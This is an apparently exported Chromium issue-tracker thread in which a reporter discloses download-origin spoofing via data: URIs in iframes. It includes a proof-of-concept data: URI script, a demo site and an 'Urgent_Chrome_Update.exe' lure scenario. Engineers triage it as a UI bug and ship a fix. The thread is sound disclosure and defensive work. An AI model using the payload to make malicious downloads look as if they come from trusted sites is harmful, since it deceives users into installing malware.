# Fake Downloads and Deceptive Notifications through Browsing History Manipulation.

| Field | Value |
|-------|-------|
| **Issue ID** | [393431136](https://issues.chromium.org/issues/393431136) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | UI>Browser>Downloads, UI>Browser>Navigation |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | st...@gmail.com |
| **Assignee** | qi...@chromium.org |
| **Created** | 2025-01-30 |
| **Bounty** | $5,000.00 |

## Description

Security Bug

Important: Please do not change the component of this bug manually.

Please READ THIS FAQ before filing a bug: https://chromium.googlesource.com/chromium/src/+/HEAD/docs/security/faq.md

Please see the following link for instructions on filing security bugs: https://www.chromium.org/Home/chromium-security/reporting-security-bugs

Reports may be eligible for reward payments under the Chrome VRP: https://g.co/chrome/vrp

NOTE: Security bugs are normally made public once a fix has been widely deployed.

-------------------------

VULNERABILITY DETAILS

There is an issue where abusing data: URI lets you to notify fake downloads with any legitimate site's origin on top of that legitimate site.

```
data:text/html,<script> function a(){ window.open('https://google.com', 'x'); setTimeout(function(){ window.open('https://pwning.geniuscoolcat.com/googledown.php', 'x'); }, 1000); setTimeout(function(){ window.open('https://pwning.geniuscoolcat.com/googledown.php', 'x'); }, 2000); setTimeout(function(){ window.open('https://pwning.geniuscoolcat.com/googledown.php', 'x'); }, 3000); } </script> <center><input type="button" class="button" value="Click here to go to google.com" onclick="a()"></center>
```

when you force download with window.open() from data: origin, Chrome actually thinks these multiply downloaded files are from any legitimate site which is on the top, like https://google.com https://apple.com for example.

However, attack vector through data: URI alone is not that useful as it is because Chrome doesn't allow to load data: URI on the top page anymore for phishing protection since many years ago- which means it's pretty much useless unless you can find the way to trick users to make them open URI with the payload inadvertantly, in order to trigger this issue.

So the first thing that came to my mind is loading it inside a frame- since we're able to load data: inside an iframe, I tested with malicious example site (https://pwning.geniuscoolcat.com) and that did allow to make this work to download files from malicious example site like it's from any legitimate trusted site which is on the top. (https://www.google.com)

Similar issue would be https://issues.chromium.org/issues/328278718 but the difference in behaviour is that this one I'm reporting here doesn't require any manual navigation to conduct a successful attack.

VERSION
Chrome Version: 134.0.6974.3 dev
Operating System: Windows 11

REPRODUCTION CASE
Please include a demonstration of the security bug, such as an attached HTML or binary file that reproduces the bug when loaded in Chrome. PLEASE make the file as small as possible and remove any content not required to demonstrate the bug, or any personal or confidential information.

Please attach files directly, not in zip or other archive formats, and if you've created a demonstration site please also attach the files needed to reproduce the demonstration locally.

FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION
Type of crash: [tab, browser, etc.]
Crash State: [see link above: stack trace *with symbols*, registers, exception record]
Client ID (if relevant): [see link above]

CREDIT INFORMATION
Externally reported security bugs may appear in Chrome release notes. If this bug is included, how would you like to be credited?
Reporter credit: [goes here]

## Attachments

- [empty.html](attachments/empty.html) (text/html, 4 B)
- [googledown.html](attachments/googledown.html) (text/html, 371 B)
- [googledowner.html](attachments/googledowner.html) (text/html, 803 B)
- [googledowner.mp4](attachments/googledowner.mp4) (video/mp4, 973.1 KB)
- [googledown.php](attachments/googledown.php) (application/x-httpd-php, 371 B)
- [Chrome_Actual_behaviour.mp4](attachments/Chrome_Actual_behaviour.mp4) (video/mp4, 1.2 MB)
- [empty.html](attachments/empty.html) (text/html, 4 B)
- [googledown.php](attachments/googledown.php) (application/x-httpd-php, 371 B)
- [googledowner.html](attachments/googledowner.html) (text/html, 803 B)
- [wincloser.mp4](attachments/wincloser.mp4) (video/mp4, 1.1 MB)
- [empty.html](attachments/empty.html) (text/html, 4 B)
- [googledownertest.html](attachments/googledownertest.html) (text/html, 816 B)
- [googledown.php](attachments/googledown.php) (application/x-httpd-php, 371 B)

## Timeline

### pr...@gmail.com (2025-01-30)

Please visit https://pwning.geniuscoolcat.com/googledowner.html if you want to test on malicious example site straight away.

### pr...@gmail.com (2025-01-31)

I just realised I forgot to add steps to reproduce in main report, so here is simple steps:

1. Visit https://pwning.geniuscoolcat.com/googledowner.html or download attached files and upload to your test website to open googledowner.html

2. Go to https://google.com via "google.com" button and confirm it's successfully done

3. Download notification indicates that downloaded multiple files are from "https://www.google.com"

### pr...@gmail.com (2025-01-31)

I also just realised that one of the attached files has a wrong extension which is "googledown.html" and that should be "googledown.php".

I attached the correct one below. (just replace googledown.html to this file, there is no problem with rest of files)

### pr...@gmail.com (2025-01-31)

Expected behaviour: Chrome indicates downloaded files are from "https://pwning.geniuscoolcat.com" just like when you try to reproduce this issue without triggering from data: origin.

Actual behaviour: As you can see from a PoC demo video I attached below, "https://pwning.geniuscoolcat.com" downloaded multiple files from a malicious site, but Chrome thinks they're from "https://www.google.com"

### bb...@google.com (2025-01-31)

Thank you for your report.

You mention you don't require manual navigation to execute the attack.

Reproducing with the changed files is a bit challenging with the php requirement and the replacements. It seems that you *do* require some user interaction
beyond clicking the "to google" button, in that you need to return to the previous tab/window and confirm that it did it's thing, after opening the google window. Can you confirm this is expected?

Please attach just the full list of things again to reproduce with specific instrutions for how to set it up. an

### pr...@gmail.com (2025-01-31)

Thanks for your reply.

This is just one of the ways to reproduce this issue, I did add a confirmation dialog in the PoC to show this is coming from "https://pwning.geniuscoolcat.com" but not from "https://google.com"- this doesn't require to confirm that dialog (clicking it "ok") or return to previous tab/window, I'll attach different test cases to show that, after all is done.

I attached all needed files below.

For this test case, Open googledowner.html, click on "https://google.com" button and come back to googledowner.html to check the dialog that says "Successfully done". Whether you click ok or leave as a dialog staying opened, you'll be able to confirm that Chrome is indicating "https://www.google.com" is trying to download files.

### pe...@google.com (2025-01-31)

Thank you for providing more feedback. Adding the requester to the CC list.

### bb...@google.com (2025-01-31)

Appears to work. S2 and foundin 132

### bb...@google.com (2025-01-31)

Hi qinmin, I see you fixed the related issue mentioned above, This reproduces currently in extended stable and canary.

It does appear to (at the moment) require some level of user interaction, but less so than the previous issue.

Can you take a look or pass it on to someone who can? Thanks

### qi...@google.com (2025-02-01)

I don't think this one has high severity:  
1. By default one download is always allowed on any page, so whether it is "google.com"  or "malicious.com" doesn't matter. If the download is dangerous, safebrowsing will report it later when there are enough reports.
2. Even if user allows multiple downloads from the legitmate site ("google.com"), the page cannot initiated more than 1 download. So only the first download can go through, which is allowed by default


### qi...@google.com (2025-02-01)

Actually, I don't even know if this qualifies as a security issue:
1. triggering a download as if it is from a legitimate page is a known practice.
2. The notification is mostly an display issue, allowing multiple download on the legitmate site actually won't allow multiple download from the malicious frame.

### pe...@google.com (2025-02-01)

Setting Priority to P2 to match Severity s3. If this is incorrect, please reset the priority. The automation bot account won't make this change again.

### qi...@google.com (2025-02-03)

Removing from vulnerability as this feels more like a bug on UI

### pr...@gmail.com (2025-02-03)

Thanks for your reply and sorry for the late response due to sickness.

In both comments #c11 and #c12, you emphasized that multiple downloads are not working. But that's the part I never considered or thought as a problem in this report.

I'd like to let you know that the main point and intention of this report is "Download blocked" popup telling downloaded file "Urgent_Chrome_Update" was from https://google.com . In the end, users are only going to able to see from their Desktop Chrome telling that "Urgent_Chrome_Update.exe" downloaded from https://google.com since "Download blocked" notification popup appears that says downloaded file(s) are from "https://google.com" which is a origin spoofing issue.


### qi...@google.com (2025-02-03)

The first download is always approved, so whether a bad download is seemingly from a legit page or not doesn't matter.  Safe browsing and quarantine software are responsible for verifying the safety of the download.

Because there are multiple downloads, Chrome will block subsequent downloads from that origin. Since the origin is opague in this case, there is no good way to show the origin in the download blocked popup on the omnibox and thus the download is silently blocked. That's why if you stay on http://google.com tab, you won't see any warnings or popups. However, if you switch to another tab and switches back to google.com tab, that triggers some logic to refresh all the omnibox popups and thus a download blocked warning will be shown. Since this is an refresh, the popup has no idea what download it has blocked previously and thus will just use the page domain as the origin. However, choose "allowing download" from that popup won't have any impact on the blocked status of the opaque origin.


### pr...@gmail.com (2025-02-03)

That's same thought on this behaviour I'm having and that's the reason when I test with my another test case which uses another window popup with "https://geniuscoolcat.com/wincloser.php" it'll work without switching tab and immediately shows "Download blocked" with https://google.com origin.

Btw, does that mean the reason https://issues.chromium.org/issues/328278718 was treated as a S2 issue is because after second downloaded file for Chrome, there is no Safe browsing and quarantine software for verifying the safety of the download? I don't know too much about this difference so I assumed first vs second, third ... downloads are treated equally and mitigated by those protections, but the file download origin spoofing part is what made to decide fixing that issue too https://issues.chromium.org/issues/328278718 

Please let me know if I'm misunderstood something though as I'm not too familiar with those mitigations as I mentioned above. 

### qi...@google.com (2025-02-03)

https://issues.chromium.org/issues/328278718  is a little different. The POC can trigger a new download if user acking the "download blocked"  pop up. However, for this bug, it is mostly incorrectly displaying a popup since the download is silently blocked. However,  acking the popup has no effect on the block status, so I don't think this is a vulnerability

### pr...@gmail.com (2025-02-03)

So it seems there is no actual difference in those mitigations it seems, then like I mentioned in reply above, I didn't consider that part (think acking multiple downloads is irrelevant when it comes to deciding it's issue, but I understand it could aid for exploit) and while I understand that thought I'm not very sure why acking popup part is too important which rules everything "issue or not" making this not an issue, since what users see is "Urgent_Chrome_Update" with "Download blocked" indicating it was from "google.com" spoofing.

But if that has to be the decision for now, without me providing any further impacts shown, I respect that.

### ap...@google.com (2025-02-04)

Project: chromium/src  

Branch: main  

Author: Min Qin <[qinmin@chromium.org](mailto:qinmin@chromium.org)>  

Link:      <https://chromium-review.googlesource.com/6222720>

Don't show download blocked icon for silently blocked download

---


Expand for full commit details
```
Don't show download blocked icon for silently blocked download 
 
If multiple downloads are triggered by an opaque origin, the latter 
downloads will be silently blocked. However, if user goes to another 
tab and then navigates back, he will see the download blocked icon 
with a wrong site URL in the radio button. This CL fixes that 
behavior so user will continue to see no icon since the download is 
silently blocked. 
 
Bug: 393431136 
Change-Id: I3058c48a8438e5a0d571a34312da77d3029a741f 
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/6222720 
Reviewed-by: Balazs Engedy <engedy@chromium.org> 
Commit-Queue: Min Qin <qinmin@chromium.org> 
Cr-Commit-Position: refs/heads/main@{#1415787}

```

---

Files:

- M `chrome/browser/download/download_request_limiter.cc`
- M `chrome/browser/download/download_request_limiter_unittest.cc`
- M `chrome/browser/ui/content_settings/content_setting_image_model_browsertest.cc`

---

Hash: 90d6bb278e0d347ee49e83b015df5d38927be5f1  

Date:  Tue Feb 04 13:17:18 2025


---

### pr...@gmail.com (2025-02-05)

Thanks for the fix. 

I hope this also fixes opening wincloser with window.close() to make this work without manually switching tab and come back which I elaborated in comment #17.

### am...@chromium.org (2025-02-20)

Thank you for the report. Upon our assessment we agree with the assertion that this is not an exploitable security issue and there is little potential for user harm in a realistic real-world scenario. As such, this report is unfortunately not eligible for a Chrome VRP reward.

### pr...@gmail.com (2025-02-20)

Hi, I believe this issue has not been understood as I shown in the demo video. While it is true that multiple downloads won't trigger, that was not the intention of this report- this is an issue that allows to download malicious file "Urgent_Chrome_Update.exe" for Windows or "Urgent_Chrome_Update.apk" for Android (more likely attack scenario there probably) with "google.com" popup indicating its source is google.com with switching tab or even without it with the trick as I mentioned in #comment17 .

Additionally, trying to click button on the PoC demo site once more to confirm the source of "Urgent_Chrome_Update.exe" will show you "google.com" blocking multiple downloads even before the next single download file triggered by a click event "Urgent_Chrome_Update.exe" indicating it is indeed from "google.com" letting users trust and download the file. (Again, while it's a different issue, this works on Android too which has a less mitigation explained above, like https://issues.chromium.org/issues/328278718)

### ch...@google.com (2025-05-16)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/393431136)*
